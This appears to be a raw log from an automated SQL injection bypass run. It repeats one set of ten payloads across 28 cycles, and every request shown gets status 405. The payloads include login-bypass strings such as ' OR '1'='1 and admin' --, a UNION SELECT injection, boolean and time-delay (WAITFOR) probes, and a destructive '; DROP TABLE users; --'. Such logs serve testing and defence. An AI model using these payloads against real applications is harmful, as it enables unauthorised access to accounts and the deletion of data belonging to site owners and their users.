2026-04-19 16:36:41 | SQLI_BYPASS | cycle=1 | query=' OR '1'='1 | status=405
2026-04-19 16:36:52 | SQLI_BYPASS | cycle=6 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:36:52 | SQLI_BYPASS | cycle=6 | query=admin' OR 'a'='a | status=405
2026-04-19 16:36:53 | SQLI_BYPASS | cycle=6 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:36:53 | SQLI_BYPASS | cycle=6 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:36:53 | SQLI_BYPASS | cycle=7 | query=' OR '1'='1 | status=405
2026-04-19 16:36:53 | SQLI_BYPASS | cycle=7 | query=admin' -- | status=405
2026-04-19 16:36:54 | SQLI_BYPASS | cycle=7 | query=admin' # | status=405
2026-04-19 16:36:54 | SQLI_BYPASS | cycle=7 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:36:54 | SQLI_BYPASS | cycle=7 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:36:54 | SQLI_BYPASS | cycle=7 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:36:54 | SQLI_BYPASS | cycle=7 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:36:55 | SQLI_BYPASS | cycle=7 | query=admin' OR 'a'='a | status=405
2026-04-19 16:36:55 | SQLI_BYPASS | cycle=7 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:36:55 | SQLI_BYPASS | cycle=7 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:36:55 | SQLI_BYPASS | cycle=8 | query=' OR '1'='1 | status=405
2026-04-19 16:36:55 | SQLI_BYPASS | cycle=8 | query=admin' -- | status=405
2026-04-19 16:36:56 | SQLI_BYPASS | cycle=8 | query=admin' # | status=405
2026-04-19 16:36:56 | SQLI_BYPASS | cycle=8 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:36:56 | SQLI_BYPASS | cycle=8 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:36:56 | SQLI_BYPASS | cycle=8 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:36:57 | SQLI_BYPASS | cycle=8 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:36:57 | SQLI_BYPASS | cycle=8 | query=admin' OR 'a'='a | status=405
2026-04-19 16:36:57 | SQLI_BYPASS | cycle=8 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:36:57 | SQLI_BYPASS | cycle=8 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:36:57 | SQLI_BYPASS | cycle=9 | query=' OR '1'='1 | status=405
2026-04-19 16:36:57 | SQLI_BYPASS | cycle=9 | query=admin' -- | status=405
2026-04-19 16:36:58 | SQLI_BYPASS | cycle=9 | query=admin' # | status=405
2026-04-19 16:36:58 | SQLI_BYPASS | cycle=9 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:36:58 | SQLI_BYPASS | cycle=9 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:36:58 | SQLI_BYPASS | cycle=9 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:36:59 | SQLI_BYPASS | cycle=9 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:36:59 | SQLI_BYPASS | cycle=9 | query=admin' OR 'a'='a | status=405
2026-04-19 16:36:59 | SQLI_BYPASS | cycle=9 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:36:59 | SQLI_BYPASS | cycle=9 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:36:59 | SQLI_BYPASS | cycle=10 | query=' OR '1'='1 | status=405
2026-04-19 16:36:59 | SQLI_BYPASS | cycle=10 | query=admin' -- | status=405
2026-04-19 16:37:00 | SQLI_BYPASS | cycle=10 | query=admin' # | status=405
2026-04-19 16:37:00 | SQLI_BYPASS | cycle=10 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:00 | SQLI_BYPASS | cycle=10 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:00 | SQLI_BYPASS | cycle=10 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:00 | SQLI_BYPASS | cycle=10 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:01 | SQLI_BYPASS | cycle=10 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:01 | SQLI_BYPASS | cycle=10 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:01 | SQLI_BYPASS | cycle=10 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:01 | SQLI_BYPASS | cycle=11 | query=' OR '1'='1 | status=405
2026-04-19 16:37:01 | SQLI_BYPASS | cycle=11 | query=admin' -- | status=405
2026-04-19 16:37:02 | SQLI_BYPASS | cycle=11 | query=admin' # | status=405
2026-04-19 16:37:02 | SQLI_BYPASS | cycle=11 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:02 | SQLI_BYPASS | cycle=11 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:02 | SQLI_BYPASS | cycle=11 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:02 | SQLI_BYPASS | cycle=11 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:03 | SQLI_BYPASS | cycle=11 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:03 | SQLI_BYPASS | cycle=11 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:03 | SQLI_BYPASS | cycle=11 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:03 | SQLI_BYPASS | cycle=12 | query=' OR '1'='1 | status=405
2026-04-19 16:37:03 | SQLI_BYPASS | cycle=12 | query=admin' -- | status=405
2026-04-19 16:37:04 | SQLI_BYPASS | cycle=12 | query=admin' # | status=405
2026-04-19 16:37:04 | SQLI_BYPASS | cycle=12 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:04 | SQLI_BYPASS | cycle=12 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:04 | SQLI_BYPASS | cycle=12 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:05 | SQLI_BYPASS | cycle=12 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:05 | SQLI_BYPASS | cycle=12 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:05 | SQLI_BYPASS | cycle=12 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:05 | SQLI_BYPASS | cycle=12 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:05 | SQLI_BYPASS | cycle=13 | query=' OR '1'='1 | status=405
2026-04-19 16:37:06 | SQLI_BYPASS | cycle=13 | query=admin' -- | status=405
2026-04-19 16:37:06 | SQLI_BYPASS | cycle=13 | query=admin' # | status=405
2026-04-19 16:37:06 | SQLI_BYPASS | cycle=13 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:06 | SQLI_BYPASS | cycle=13 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:07 | SQLI_BYPASS | cycle=13 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:07 | SQLI_BYPASS | cycle=13 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:07 | SQLI_BYPASS | cycle=13 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:07 | SQLI_BYPASS | cycle=13 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:08 | SQLI_BYPASS | cycle=13 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:08 | SQLI_BYPASS | cycle=14 | query=' OR '1'='1 | status=405
2026-04-19 16:37:08 | SQLI_BYPASS | cycle=14 | query=admin' -- | status=405
2026-04-19 16:37:08 | SQLI_BYPASS | cycle=14 | query=admin' # | status=405
2026-04-19 16:37:09 | SQLI_BYPASS | cycle=14 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:09 | SQLI_BYPASS | cycle=14 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:09 | SQLI_BYPASS | cycle=14 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:09 | SQLI_BYPASS | cycle=14 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:09 | SQLI_BYPASS | cycle=14 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:10 | SQLI_BYPASS | cycle=14 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:10 | SQLI_BYPASS | cycle=14 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:10 | SQLI_BYPASS | cycle=15 | query=' OR '1'='1 | status=405
2026-04-19 16:37:10 | SQLI_BYPASS | cycle=15 | query=admin' -- | status=405
2026-04-19 16:37:10 | SQLI_BYPASS | cycle=15 | query=admin' # | status=405
2026-04-19 16:37:11 | SQLI_BYPASS | cycle=15 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:11 | SQLI_BYPASS | cycle=15 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:11 | SQLI_BYPASS | cycle=15 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:11 | SQLI_BYPASS | cycle=15 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:11 | SQLI_BYPASS | cycle=15 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:12 | SQLI_BYPASS | cycle=15 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:12 | SQLI_BYPASS | cycle=15 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:12 | SQLI_BYPASS | cycle=16 | query=' OR '1'='1 | status=405
2026-04-19 16:37:12 | SQLI_BYPASS | cycle=16 | query=admin' -- | status=405
2026-04-19 16:37:12 | SQLI_BYPASS | cycle=16 | query=admin' # | status=405
2026-04-19 16:37:12 | SQLI_BYPASS | cycle=16 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:13 | SQLI_BYPASS | cycle=16 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:13 | SQLI_BYPASS | cycle=16 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:13 | SQLI_BYPASS | cycle=16 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:13 | SQLI_BYPASS | cycle=16 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:14 | SQLI_BYPASS | cycle=16 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:14 | SQLI_BYPASS | cycle=16 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:14 | SQLI_BYPASS | cycle=17 | query=' OR '1'='1 | status=405
2026-04-19 16:37:14 | SQLI_BYPASS | cycle=17 | query=admin' -- | status=405
2026-04-19 16:37:14 | SQLI_BYPASS | cycle=17 | query=admin' # | status=405
2026-04-19 16:37:15 | SQLI_BYPASS | cycle=17 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:15 | SQLI_BYPASS | cycle=17 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:15 | SQLI_BYPASS | cycle=17 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:15 | SQLI_BYPASS | cycle=17 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:16 | SQLI_BYPASS | cycle=17 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:16 | SQLI_BYPASS | cycle=17 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:16 | SQLI_BYPASS | cycle=17 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:16 | SQLI_BYPASS | cycle=18 | query=' OR '1'='1 | status=405
2026-04-19 16:37:16 | SQLI_BYPASS | cycle=18 | query=admin' -- | status=405
2026-04-19 16:37:16 | SQLI_BYPASS | cycle=18 | query=admin' # | status=405
2026-04-19 16:37:17 | SQLI_BYPASS | cycle=18 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:17 | SQLI_BYPASS | cycle=18 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:17 | SQLI_BYPASS | cycle=18 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:17 | SQLI_BYPASS | cycle=18 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:17 | SQLI_BYPASS | cycle=18 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:18 | SQLI_BYPASS | cycle=18 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:18 | SQLI_BYPASS | cycle=18 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:18 | SQLI_BYPASS | cycle=19 | query=' OR '1'='1 | status=405
2026-04-19 16:37:18 | SQLI_BYPASS | cycle=19 | query=admin' -- | status=405
2026-04-19 16:37:18 | SQLI_BYPASS | cycle=19 | query=admin' # | status=405
2026-04-19 16:37:19 | SQLI_BYPASS | cycle=19 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:19 | SQLI_BYPASS | cycle=19 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:19 | SQLI_BYPASS | cycle=19 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:19 | SQLI_BYPASS | cycle=19 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:19 | SQLI_BYPASS | cycle=19 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:20 | SQLI_BYPASS | cycle=19 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:20 | SQLI_BYPASS | cycle=19 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:20 | SQLI_BYPASS | cycle=20 | query=' OR '1'='1 | status=405
2026-04-19 16:37:20 | SQLI_BYPASS | cycle=20 | query=admin' -- | status=405
2026-04-19 16:37:20 | SQLI_BYPASS | cycle=20 | query=admin' # | status=405
2026-04-19 16:37:20 | SQLI_BYPASS | cycle=20 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:20 | SQLI_BYPASS | cycle=20 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:21 | SQLI_BYPASS | cycle=20 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:21 | SQLI_BYPASS | cycle=20 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:21 | SQLI_BYPASS | cycle=20 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:21 | SQLI_BYPASS | cycle=20 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:21 | SQLI_BYPASS | cycle=20 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:22 | SQLI_BYPASS | cycle=21 | query=' OR '1'='1 | status=405
2026-04-19 16:37:22 | SQLI_BYPASS | cycle=21 | query=admin' -- | status=405
2026-04-19 16:37:22 | SQLI_BYPASS | cycle=21 | query=admin' # | status=405
2026-04-19 16:37:22 | SQLI_BYPASS | cycle=21 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:22 | SQLI_BYPASS | cycle=21 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:23 | SQLI_BYPASS | cycle=21 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:23 | SQLI_BYPASS | cycle=21 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:23 | SQLI_BYPASS | cycle=21 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:23 | SQLI_BYPASS | cycle=21 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:23 | SQLI_BYPASS | cycle=21 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:23 | SQLI_BYPASS | cycle=22 | query=' OR '1'='1 | status=405
2026-04-19 16:37:24 | SQLI_BYPASS | cycle=22 | query=admin' -- | status=405
2026-04-19 16:37:24 | SQLI_BYPASS | cycle=22 | query=admin' # | status=405
2026-04-19 16:37:24 | SQLI_BYPASS | cycle=22 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:24 | SQLI_BYPASS | cycle=22 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:24 | SQLI_BYPASS | cycle=22 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:25 | SQLI_BYPASS | cycle=22 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:25 | SQLI_BYPASS | cycle=22 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:25 | SQLI_BYPASS | cycle=22 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:25 | SQLI_BYPASS | cycle=22 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:26 | SQLI_BYPASS | cycle=23 | query=' OR '1'='1 | status=405
2026-04-19 16:37:26 | SQLI_BYPASS | cycle=23 | query=admin' -- | status=405
2026-04-19 16:37:26 | SQLI_BYPASS | cycle=23 | query=admin' # | status=405
2026-04-19 16:37:26 | SQLI_BYPASS | cycle=23 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:27 | SQLI_BYPASS | cycle=23 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:27 | SQLI_BYPASS | cycle=23 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:27 | SQLI_BYPASS | cycle=23 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:27 | SQLI_BYPASS | cycle=23 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:27 | SQLI_BYPASS | cycle=23 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:27 | SQLI_BYPASS | cycle=23 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:28 | SQLI_BYPASS | cycle=24 | query=' OR '1'='1 | status=405
2026-04-19 16:37:28 | SQLI_BYPASS | cycle=24 | query=admin' -- | status=405
2026-04-19 16:37:28 | SQLI_BYPASS | cycle=24 | query=admin' # | status=405
2026-04-19 16:37:28 | SQLI_BYPASS | cycle=24 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:28 | SQLI_BYPASS | cycle=24 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:29 | SQLI_BYPASS | cycle=24 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:29 | SQLI_BYPASS | cycle=24 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:29 | SQLI_BYPASS | cycle=24 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:29 | SQLI_BYPASS | cycle=24 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:30 | SQLI_BYPASS | cycle=24 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:30 | SQLI_BYPASS | cycle=25 | query=' OR '1'='1 | status=405
2026-04-19 16:37:30 | SQLI_BYPASS | cycle=25 | query=admin' -- | status=405
2026-04-19 16:37:30 | SQLI_BYPASS | cycle=25 | query=admin' # | status=405
2026-04-19 16:37:31 | SQLI_BYPASS | cycle=25 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:31 | SQLI_BYPASS | cycle=25 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:31 | SQLI_BYPASS | cycle=25 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:31 | SQLI_BYPASS | cycle=25 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:32 | SQLI_BYPASS | cycle=25 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:32 | SQLI_BYPASS | cycle=25 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:32 | SQLI_BYPASS | cycle=25 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:32 | SQLI_BYPASS | cycle=26 | query=' OR '1'='1 | status=405
2026-04-19 16:37:32 | SQLI_BYPASS | cycle=26 | query=admin' -- | status=405
2026-04-19 16:37:32 | SQLI_BYPASS | cycle=26 | query=admin' # | status=405
2026-04-19 16:37:33 | SQLI_BYPASS | cycle=26 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:33 | SQLI_BYPASS | cycle=26 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:33 | SQLI_BYPASS | cycle=26 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:33 | SQLI_BYPASS | cycle=26 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:33 | SQLI_BYPASS | cycle=26 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:33 | SQLI_BYPASS | cycle=26 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:34 | SQLI_BYPASS | cycle=26 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:34 | SQLI_BYPASS | cycle=27 | query=' OR '1'='1 | status=405
2026-04-19 16:37:34 | SQLI_BYPASS | cycle=27 | query=admin' -- | status=405
2026-04-19 16:37:34 | SQLI_BYPASS | cycle=27 | query=admin' # | status=405
2026-04-19 16:37:34 | SQLI_BYPASS | cycle=27 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:35 | SQLI_BYPASS | cycle=27 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:35 | SQLI_BYPASS | cycle=27 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:35 | SQLI_BYPASS | cycle=27 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:35 | SQLI_BYPASS | cycle=27 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:35 | SQLI_BYPASS | cycle=27 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:35 | SQLI_BYPASS | cycle=27 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:36 | SQLI_BYPASS | cycle=28 | query=' OR '1'='1 | status=405
